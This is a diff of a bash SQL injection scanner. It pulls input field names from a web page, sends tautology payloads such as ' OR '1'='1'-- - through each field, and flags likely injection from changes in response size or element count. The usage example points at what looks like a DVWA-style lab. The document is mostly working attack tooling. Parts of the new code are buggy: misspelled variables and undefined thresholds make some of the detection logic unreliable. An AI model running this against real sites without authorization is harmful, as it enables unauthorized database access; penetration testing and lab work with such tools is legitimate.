@@ -1,10 +1,12 @@
 #!/bin/bash
 
-# simple_form_sqli.sh - Detect and test SQL injection on input forms
-
+# =========================
 # Configuration
+# =========================
 USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
 TIMEOUT=5
+threads=10
+verbose=false
 
 # Colors
 RED='\033[0;31m'
@@ -12,210 +14,339 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m'
+verbose=false
+# =========================
+# curl helpers
+# =========================
 
-# Check if page has input elements
+curl_body() {
+    local url="$1"
+
+    [ "$verbose" = true ] && echo "[curl-body] $url" >&2
+
+    curl -s -L \
+        --max-time "$TIMEOUT" \
+        -A "$USER_AGENT" \
+        --parallel --parallel-max "$threads" \
+        "${CURL_OPTS[@]}" \
+        "$url"
+}
+
+
+curl_status() {
+    local url="$1"
+
+    [ "$verbose" = true ] && echo "[curl-status] $url" >&2
+
+    curl -s \
+        -o /dev/null \
+        -w "%{http_code}" \
+        --max-time "$TIMEOUT" \
+        -A "$USER_AGENT" \
+        --parallel --parallel-max "$threads" \
+        "${CURL_OPTS[@]}" \
+        "$url"
+}
+
+# =========================
+# HTML helpers
+# =========================
+
 has_input_elements() {
     local html="$1"
-    
-    # Check for various input elements
-    if echo "$html" | grep -qi "<input\|<form\|<textarea\|<select"; then
-        return 0  # True - has input elements
-    fi
-    
-    # Also check for JavaScript form handlers
-    if echo "$html" | grep -qi "document\.forms\|\.submit()\|addEventListener.*submit\|fetch.*POST\|axios\.post"; then
-        return 0
-    fi
-    
-    return 1  # False - no input elements
+
+    echo "$html" | grep -qi \
+        "<input\|<form\|<textarea\|<select\|document\.forms\|\.submit()\|addEventListener.*submit\|fetch.*POST\|axios\.post"
 }
 
-# Extract input field names from HTML
 extract_input_fields() {
     local html="$1"
-    
-    # Extract input names from HTML forms
-    echo "$html" | grep -i '<input' | grep -o 'name=["'\'']\?[^"'\'' ]*' | \
-        sed "s/^name=['\"]//;s/['\"]$//" | grep -v '^$' | sort -u
-    
-    # Also extract textarea names
-    echo "$html" | grep -i '<textarea' | grep -o 'name=["'\'']\?[^"'\'' ]*' | \
-        sed "s/^name=['\"]//;s/['\"]$//" | grep -v '^$' | sort -u
-    
-    # Also extract select names
-    echo "$html" | grep -i '<select' | grep -o 'name=["'\'']\?[^"'\'' ]*' | \
-        sed "s/^name=['\"]//;s/['\"]$//" | grep -v '^$' | sort -u
+
+    echo "$html" |
+        grep -Ei '<input|<textarea|<select' |
+        grep -oE 'name=["'\'']?[^"'\'' >]+' |
+        sed 's/name=["'\'']//g' |
+        sort -u
 }
 
-# SQL injection payloads
-declare -a SQLI_PAYLOADS=(
-    # Basic payloads
-    "' OR '1'='1'-- -"
-    "' OR 1=1-- -"
-    "' OR 'a'='a'-- -"
-    
-    # Different quotes
-    "\" OR \"1\"=\"1\"-- -"
-    "\` OR \`1\`=\`1\`-- -"
-    
-    # Parentheses
-    "') OR '1'='1'-- -"
-    "') OR ('1'='1'-- -"
-    "')) OR (('1'='1'-- -"
-    
-    # Numeric
-    "1 OR 1=1-- -"
-    "1) OR (1=1-- -"
-    
-    # Boolean false
-    "' AND '1'='2'-- -"
-    "' OR 1=2-- -"
-    
-    # Comment variations
-    "' OR '1'='1'#"
-    "' OR 1=1#"
-    "' OR '1'='1'/*"
-)
+extract_submit_fields() {
+    local html="$1"
 
-# Test SQL injection on a URL with input field
+    echo "$html" |
+        grep -Ei '<input[^>]+type=["'\'']?submit|<button[^>]+type=["'\'']?submit' |
+        grep -oE 'name=["'\'']?[^"'\'' >]+' |
+        sed 's/name=["'\'']//g' |
+        sort -u
+}
+
+## --- Helper Functions Count Difference Elements
+# Extract HTTP body from curl response (removes status code)
+extract_body() {
+    # Remove the last line (status code) added by curl -w
+    head -n -1
+}
+# Count HTML elements in response
+count_elements() {
+    local response="$1"
+    echo $response | grep -o '<[^>]*>' | wc -l
+
+}
+# Extract page title for identification
+get_page_title() {
+    local response="$1"
+    echo "$response" | grep -o '<title>[^<]*</title>' | sed 's/<title>\(.*\)<\/title>/\1/' | head -1
+}
+# Helper to check specific pattern changes
+check_pattern_changes() {
+    local original_body="$1"
+    local sql_body="$2"
+    
+    # Common patterns to check
+    patterns=(
+        "product" "item" "row" "record" "entry"
+        "<div>" "<tr>" "<li>" "<img " "href=" "<pre>"
+    )
+
+    echo "Element Count Analysis:"
+    for pattern in "${patterns[@]}"; do
+        orig_count=$(echo "$original_body" | grep -c "$pattern")
+        sql_count=$(echo "$sql_body" | grep -c "$pattern")
+
+        if [ "$orig_count" != "$sql_count" ]; then
+            change=$(( sql_count - orig_count ))
+            echo -e "      $pattern: ${orig_count} → ${sql_count} (+${change})"
+        fi
+
+    done
+    #echo "====Original Count: $orig_count"
+    #echo "====SQL Count: $sql_body_count"
+    #Check for SQL error messages
+    
+    errorOnResonse= echo $sql_body | grep -qi "sql.*error\|syntax.*error\|mysql\|postgresql\|oracle"
+
+    #if echo "$sql_body" | grep -qi "sql.*error\|syntax.*error\|mysql\|postgresql\|oracle"; then
+        if [[ $errorOnReponse == True ]]; then
+        echo -e "${YELLOW}[!] - Response Contains Errors, indication potential SQl Injection is possible${NC}"
+        echo -e "${BLUE}Reason:$errorOnResonse${NC}"
+
+    fi
+    #fi
+}
+## -------------------------------------------------- Helper functions Count Difference on Elements
+
+
+
+
+# =========================
+# SQL injection testing
+# =========================
+
 test_input_sqli() {
     local url="$1"
-    local field_name="$2"
-    
-    echo -e "${BLUE}[*] Testing field: $field_name on $url${NC}"
-    
-    # Get baseline response
-    baseline_response=$(curl -s -L --max-time "$TIMEOUT" "$url")
-    baseline_size=$(echo "$baseline_response" | wc -c)
-    
-    # Track differences
-    local significant_differences=0
-    
-    for payload in "${SQLI_PAYLOADS[@]}"; do
-        # URL encode the payload
-        encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'\''/%27/g; s/"/%22/g; s/#/%23/g')
-        
-        # Construct test URL
-        local test_url=""
+    local field="$2"
+
+    declare -g original_body
+    declare -g original_body_size
+
+    #echo -e "${BLUE}[*] Testing field: $field${NC}"
+
+    local base_value="test"
+    local base_url
+
+    if [[ "$url" == *"?"* ]]; then
+        base_url="${url}&${field}=${base_value}"
+    else
+        base_url="${url}?${field}=${base_value}"
+    fi
+
+    original_body=$(curl_body "$base_url") #---------------------------------------------------- #Orignal Body Response
+    original_body_size=$(printf "%s" "$original_body" | wc -c)
+source config.sh
+# Create grep pattern from falsePositiveResponse array
+patterns=$(IFS='|'; echo "${sqliFormPayloads[*]}")
+
+
+    for payload in "${sqliFormPayloads[@]}"; do
+        encoded=$(curl -sG \
+            --data-urlencode "$field=$payload" \
+            -o /dev/null \
+            -w '%{url_effective}' \
+            "$url" | sed "s/^.*[?&]$field=//")
+
+        local test_url
         if [[ "$url" == *"?"* ]]; then
-            test_url="${url}&${field_name}=${encoded_payload}"
+            test_url="${url}&${field}=${encoded}&Submit=Submit"
         else
-            test_url="${url}?${field_name}=${encoded_payload}"
+            test_url="${url}?${field}=${encoded}&Submit=Submit"
         fi
-        
-        # Send request
-        response=$(curl -s -L --max-time "$TIMEOUT" "$test_url")
-        response_size=$(echo "$response" | wc -c)
-        
-        # Calculate difference
-        local size_diff=$((response_size - baseline_size))
-        local abs_diff=${size_diff#-}  # Absolute value
-        
-        # Check for significant difference
-        if [ $abs_diff -gt 100 ]; then
-            echo -e "  ${YELLOW}Payload: ${payload:0:30}...${NC}"
-            echo -e "    Size: ${baseline_size} → ${response_size} (diff: ${size_diff})"
-            significant_differences=$((significant_differences + 1))
-        fi
-        
-        # Check for SQL errors in response
-        if echo "$response" | grep -qi "sql.*error\|mysql\|postgres\|oracle\|syntax.*error"; then
-            echo -e "  ${RED}[!] SQL error with payload: ${payload:0:30}...${NC}"
-            return 0  # Vulnerable
-        fi
-        
-        sleep 0.1
-    done
-    
-    # If we found significant differences in multiple payloads
-    if [ $significant_differences -ge 3 ]; then
-        echo -e "  ${RED}[!] Multiple significant response differences detected${NC}"
-        return 0  # Likely vulnerable
-    fi
-    
-    return 1  # Not vulnerable
-}
 
-# Main function to test page for SQL injection
-test_page_for_sqli() {
-    local url="$1"
-    
-    echo -e "${GREEN}[*] Analyzing: $url${NC}"
-    
-    # Fetch the page
-    response=$(curl -s -L --max-time "$TIMEOUT" "$url")
-    
-    # Check if page has input elements
-    if ! has_input_elements "$response"; then
-        echo -e "${YELLOW}[-] No input elements found on page${NC}"
-        return 1
-    fi
-    
-    echo -e "${GREEN}[+] Page contains input elements${NC}"
-    
-    # Extract input field names
-    local fields=$(extract_input_fields "$response")
-    local field_count=$(echo "$fields" | wc -l)
-    
-    echo -e "${BLUE}[+] Found $field_count input field(s):${NC}"
-    echo "$fields" | sed 's/^/  - /'
-    
-    # Test each field
-    local vulnerable=0
-    while IFS= read -r field; do
-        [ -z "$field" ] && continue
-        
-        if test_input_sqli "$url" "$field"; then
-            echo -e "\n${RED}[VULNERABLE] ⚠️ SQL injection found in field: $field${NC}"
-            echo -e "  URL: $url"
-            vulnerable=1
-            break
-        fi
-    done <<< "$fields"
-    
-    if [ $vulnerable -eq 0 ]; then
-        echo -e "\n${GREEN}[✓] No SQL injection vulnerabilities detected${NC}"
-        return 1
-    fi
-    
-    return 0
-}
 
-# Quick test function for integration
-quick_form_sqli_check() {
-    local url="$1"
-    
-    # Quick check for input elements
-    response=$(curl -s -L --max-time 3 "$url" 2>/dev/null || true)
-    
-    if echo "$response" | grep -qi "<input"; then
-        # Found input elements, do quick SQLi test
-        echo -e "${YELLOW}[*] Page has forms, testing for SQLi...${NC}"
-        
-        # Quick test with common payload
-        test_url="${url}?test=' OR '1'='1'-- -"
-        test_response=$(curl -s -L --max-time 3 "$test_url" 2>/dev/null || true)
-        
-        baseline_size=$(echo "$response" | wc -c)
-        test_size=$(echo "$test_response" | wc -c)
-        
-        if [ $test_size -gt $((baseline_size * 2)) ] || \
-           echo "$test_response" | grep -qi "sql.*error\|mysql\|postgres"; then
-            echo -e "${RED}[!] Possible SQL injection${NC}"
+        sql_body=$(curl_body "$test_url") #---------------------------------------------------- #SQL Body Response
+        sql_body_size=$(printf "%s" "$sql_body" | wc -c)
+        diff=$(( sql_body_size - original_body_size ))
+
+
+        if (( diff > 50 || diff < -50 )); then
+            #echo "Difference in response $diff characters"
+            echo -e "${RED}[!] Possible SQLi${NC} Field: ${YELLOW}'$field'${NC} Payload: ${YELLOW}$payload${NC} (Δ=${YELLOW}$diff${NC} bytes)"
             return 0
         fi
-    fi
-    
+    done
+
     return 1
 }
 
-# Usage
-if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
-    if [ $# -eq 0 ]; then
-        echo "Usage: $0 <URL>"
-        echo "Example: $0 https://example.com/form.php"
-        exit 1
+
+# =========================
+# Main logic
+# =========================
+
+test_page_for_sqli() {
+    local url="$1"
+    if [[ $verbose == true ]]; then
+    echo -e "${GREEN}[*] Analyzing: $url${NC}"
     fi
+    response=$(curl_body "$url")
+#    echo "$response"
+submit_fields=$(extract_submit_fields "$response")
+submit_field=$(echo "$submit_fields" | head -n1)
+#echo "Submit Field:$submit_field"
+
     
-    test_page_for_sqli "$1"
+fields=$(extract_input_fields "$response")
+field_count=$(echo "$fields" | wc -l)
+    if [[ $verbose == true ]]; then
+        if ! has_input_elements "$response"; then
+        echo -e "${YELLOW}[-] No input elements found${NC}"
+        return
+        fi
+    echo -e "${GREEN}[+] Page contains input elements${NC}"
+    echo -e "${BLUE}[+] Found $field_count input field(s):${NC}"
+    echo -e "$fields"  | sed 's/^/  - /'
+    fi
+
+#--------------- Check Difference Count of Elements Place logic inside For Loop---------------------
+
+    for field in $fields; do
+        if test_input_sqli "$url" "$field"; then
+        original_count=$(count_elements "$original_body")
+        sql_count=$(count_elements "$sql_body")
+        #echo -e "${BLUE}SQL Count: $sql_count${NC}"
+        #echo "Original Count: $original_count"                
+
+        domain=$(echo $url| cut -d "/" -f 3 | cut -d "." -f 1-3)
+        sqlBodyTempFile="/tmp/sql_body_$domain.html"
+        originalBodyTempFile="/tmp/original_body_$domain.html"
+
+        echo  -e  "${BLUE}$sql_body${NC}" > $sqlBodyTempFile #sql Injection body
+        #echo -e "${RED}-------------------------------------------------------------------------------${NC}"
+        echo -e  "${GREEN}$original_body${NC}" > $originalBodyTempFile
+        #echo -e  "${GREEN}$test1${NC}"
+
+        if [[ $verbose == true ]]; then
+        echo -e "${BLUE}}------------- Difference between requests -------------${NC}"
+        differenceBetweenRequests=$(diff "$originalBodyTempFile" "$sqlBodyTempFile" | grep -i "$field")
+        countDifferenceBetweenRequests=$(echo "$differenceBetweenRequests" | wc -w)
+            if [[ $countDifferenceBetweenRequests -ge 150 ]]; then
+                echo "DIfference between requests too large to show on verbose, please check manually"
+            else
+            echo "$differenceBetweenRequests"
+            echo -e "${BLUE}----------------------------------------------------------$NC"
+            fi
+        fi
+
+
+
+if [[ "$original_title" != "$sql_title" ]]; then
+    echo -e "${RED}⚠️ Title changed!${NC}"
+    echo "Original: $original_title"
+    echo "SQL test: $sql_title"
 fi
+
+    #----------------------- Check Count of Elements
+ if [ "$sql_count" -gt "$original_count" ]; then
+        if [ $increase_pct -ge $THRESHOLD_PERCENT ]; then
+            echo -e "${YELLOW}---------------------------------------------------------------------${NC}"
+            echo -e "${RED}[VULNERABLE] ⚠️ POSSIBLE SQL INJECTION VULNERABILITY DETECTED!${NC}"
+            echo -e "    URL: ${YELLOW}$url${NC}"
+            echo -e "    Payload: ${YELLOW}$payload${NC}"
+            echo -e "    Reason: ${BLUE}Elements on page increased$ ${increase_pct}% (${original_count} → ${sql_count})${NC}"
+            if [[ $versbose == true ]]; then
+
+            #echo ""
+            
+            # Try to identify what changed (product count, etc.)
+           echo "    Element Count Analysis:"
+           echo "       Original: $original_count HTML elements"
+           echo "       SQL test: $sql_count HTML elements"
+    
+            # Check for common patterns
+            check_pattern_changes "$original_body" "$sql_body"
+            fi
+            return 0  # Vulnerability detected
+        else
+            echo "[-] Minor element count change (${increase_pct}%)"
+            return 1  # Not vulnerable
+        fi
+    elif [ "$sql_count" -lt "$original_count" ]; then
+        decrease_pct=$(( (original_count - sql_count) * 100 / original_count ))
+        echo "[-] Element count decreased by ${decrease_pct}%"
+        echo "(Could be error-based SQLi or application error)"
+        return 1
+    else
+        #echo "[-] No change in element count"
+        return 1
+    fi
+
+
+# Clean up temp files
+#rm $sqlBodyTempFile
+#rm $originalBodyTempFile
+
+
+        fi
+    done
+
+}
+
+# =========================
+# Payloads
+# =========================
+
+SQLI_PAYLOADS=(
+    "' OR '1'='1'-- -"
+    "' OR 1=1-- -"
+    "\" OR \"1\"=\"1\"-- -"
+)
+
+# =========================
+# Entry point
+# =========================
+
+if [ -z "$1" ]; then
+    echo "Usage: $0 <url> [curl options]"
+    echo "Example:"
+    echo "  $0 https://target -H \"Cookie: PHPSESSID=123; key=low\""
+    exit 1
+fi
+
+URL="$1"
+shift
+
+CURL_OPTS=()
+
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        -v|--verbose)
+            verbose=true
+            shift
+            ;;
+        *)
+            CURL_OPTS+=("$1")
+            shift
+            ;;
+    esac
+done
+
+test_page_for_sqli "$URL"
+
